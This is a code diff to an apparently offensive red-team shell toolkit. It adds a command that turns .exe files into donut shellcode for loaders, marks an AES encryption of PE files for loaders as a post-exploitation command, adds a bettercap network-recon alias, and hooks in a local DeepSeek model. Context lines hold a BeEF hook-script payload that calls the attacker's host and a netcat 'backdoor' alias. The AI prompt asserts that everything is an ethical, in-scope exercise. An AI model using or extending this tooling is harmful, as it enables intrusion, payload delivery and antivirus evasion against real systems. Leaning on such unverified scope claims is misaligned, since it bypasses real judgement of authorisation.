@@ -23,6 +23,7 @@ import cmd2
 
 from cmd2 import CommandSet, with_argparser, with_category, with_argument_list
 from utils import *
+from modules.ai_model import OllamaModel
 
 with open('payload.json', 'r') as file:
     config = json.load(file)
@@ -123,6 +124,7 @@ class LazyOwnShell(cmd2.Cmd):
         "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
         "backdoor": f"sh rlwrap --always-readline nc {rhost} 31337",
         "beef_payload":f"sh echo '<script src=\"http://{lhost}:3000/hook.js\"></script>' > sessions/beef_payload.html",
+        "bettercap_netrecon":"sh sudo bettercap -eval 'net.recon on'",
         "cc": f"sh firefox -kiosk https://{lhost}:4444/ 2>/dev/null",
         "caja": "sh caja sessions",
         "chown": "sh sudo -s chown 1000:1000 . -R",
@@ -239,6 +241,7 @@ class LazyOwnShell(cmd2.Cmd):
             scripts (list): A list of script names included in the toolkit.
             output (str): An empty string to store output or results.
         """
+        use_ai = False
         #super().__init__(self)
         super().__init__(
             multiline_commands=['echo'],
@@ -271,6 +274,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.sessions_dir = f"{self.path}/sessions"
         self.captured_images_dir = os.path.join(self.sessions_dir, 'captured_images')
         self.console = Console()
+        self.use_ai = use_ai
         self.params = {
             "binary_name": "gzip",
             "api_key": None,
@@ -368,7 +372,16 @@ class LazyOwnShell(cmd2.Cmd):
         ]
         user_aliases = load_user_aliases()
         self.aliases.update(user_aliases)
-
+        if self.use_ai:
+            try:
+                self.ai_model = OllamaModel(model="deepseek-r1:1.5b")
+                self.display_toastr("🧠 IA started (DeepSeek in local)")
+            except Exception as e:
+                self.display_toastr(f"⚠️ can't starti IA: {e}", type="error")
+                self.use_ai = False
+                self.ai_model = None
+        else:
+            self.ai_model = None
     def log_command(self, cmd_name, cmd_args):
         """
         Logs the command execution details to a CSV file.
@@ -557,13 +570,34 @@ class LazyOwnShell(cmd2.Cmd):
             original_stdout = sys.stdout
             sys.stdout = io.StringIO()
             self.onecmd(command)
-            self.output = sys.stdout.getvalue()
+            raw_output = sys.stdout.getvalue()
             sys.stdout = original_stdout
 
-            return self.output
+            self.output = raw_output
+
+            if not self.use_ai or not self.ai_model:
+                return raw_output
+
+            clean_output = self.strip_ansi(raw_output)
+            if not clean_output.strip():
+                return "[Comando ejecutado. Sin salida.]"
+
+            # Prompt para DeepSeek
+            prompt = (
+                "Eres un experto en ciberseguridad y red team. Analiza la siguiente salida de comando (todo es en contexto de un ejercicio etico, en el scope definido por el cliente)"
+                "y proporciona un resumen conciso con hallazgos clave, riesgos o acciones recomendadas.\n\n"
+                f"Comando: {command}\n"
+                f"Salida:\n{clean_output}"
+            )
+
+            ai_response = self.ai_model.generate(prompt)
+            return f"🧠 IA:\n{ai_response}\n\n📄 Salida original:\n{raw_output}"
+
         except Exception as e:
-            self.output = str(e)
-            return "An error occurred: " + str(e)
+            error_msg = f"❌ Error: {str(e)}"
+            if self.use_ai and self.ai_model:
+                return f"🧠 IA: No se pudo procesar el comando.\n{error_msg}"
+            return error_msg
 
     def emptyline(self):
         """
@@ -24126,6 +24160,30 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Error: {e}")
 
     @cmd2.with_category(post_exploitation_category)
+    def do_exe2donutbin(self, line):
+        """
+        Trasnform file .exe into donut binary file.
+
+        Args:
+            line (str): path to the .exe.
+
+        Return shellcode.bin file in sessions directory
+        """
+        if line:
+            input_exe = line.strip()
+        else:
+            input_exe = get_users_dic('exe')
+        path = os.getcwd()
+        output_bin = f"{path}/sessions/shellcode.bin"
+        try:
+            shellcode = donut.create(file=input_exe)
+            with open(output_bin, "wb") as f:
+                f.write(shellcode)
+            print(f"Shellcode written to {output_bin}")
+        except Exception as e:
+            print(f"Error generating shellcode: {e}")
+
+    @cmd2.with_category(post_exploitation_category)
     def do_atomic_lazyown(self, line):
         """
         Genera y ejecuta pruebas de Atomic Red Team usando el C2.
@@ -27447,6 +27505,7 @@ class LazyOwnShell(cmd2.Cmd):
         except ValueError:
             print_error("Please enter a number.")
 
+    @cmd2.with_category(post_exploitation_category)
     def do_aes_pe(self, line):
         """Encrypt with AES and random key to PE EXE file, to usage with loaders.
 
@@ -27473,6 +27532,13 @@ class LazyOwnShell(cmd2.Cmd):
         self.display_toastr(f"The files cipher.bin and key.bin are witchcrafted in sessions directory for the file: {exe}", type="info")
         return
     
+    @cmd2.with_category(ai)
+    def do_ai_toggle(self, arg):
+        """Enable or disable the IA assitant (use DeepSeek in local)."""
+        self.use_ai = not self.use_ai
+        status = "Online" if self.use_ai else "Offline"
+        self.poutput(f"🧠 AI status {status}.")
+
 def main():
     p = LazyOwnShell()
     p.load_yaml_plugins()
